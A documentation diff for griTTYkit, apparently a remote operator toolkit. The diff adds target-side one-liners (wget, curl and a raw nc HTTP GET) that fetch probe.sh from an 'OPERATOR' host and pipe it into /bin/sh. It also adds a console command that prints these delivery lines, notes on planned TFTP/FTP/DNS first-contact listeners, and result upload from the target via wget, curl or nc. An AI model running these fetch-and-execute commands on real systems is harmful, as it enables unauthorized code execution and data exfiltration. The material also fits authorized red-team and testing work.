@@ -25,16 +25,25 @@ On the target, download and run it with whatever basic tool is available:
 
 ```sh
 wget -O- http://OPERATOR:22207/probe.sh | /bin/sh
+curl -fsSL http://OPERATOR:22207/probe.sh | /bin/sh
+printf 'GET /probe.sh HTTP/1.0\r\nHost: OPERATOR\r\n\r\n' | nc OPERATOR 22207 | sed '1,/^\r*$/d' | /bin/sh
 ```
 
 The line-oriented console wraps the same workflow:
 
 ```text
 grit[all]> probe --start
+grit[all]> probe delivery
 grit[all]> probe results
 grit[all]> probe config --write-config configs/grit.conf
 grit[all]> probe serve --start
 ```
+
+`probe delivery` shows target-side `wget`, `curl`, and raw `nc` HTTP GET
+commands for the current direct or bridged probe route. The current listener is
+`probe-http`; future listener names are reserved for `probe-tftp`, `probe-ftp`,
+and `probe-dns` so the console can grow into separate first-contact delivery
+services without changing the probe result workflow.
 
 `probe serve --start` stages the matching release artifact and prints target
 fetch options. On a target that does not have griTTYkit yet, use the printed
@@ -82,5 +91,5 @@ Operator-side records:
   events.
 
 The probe script is not a griTTYkit binary and does not assume a target
-architecture. It only requires `/bin/sh`; upload requires either `wget` or
-`curl` on the target.
+architecture. It only requires `/bin/sh`; result upload uses `wget`, `curl`, or
+raw `nc` when available.
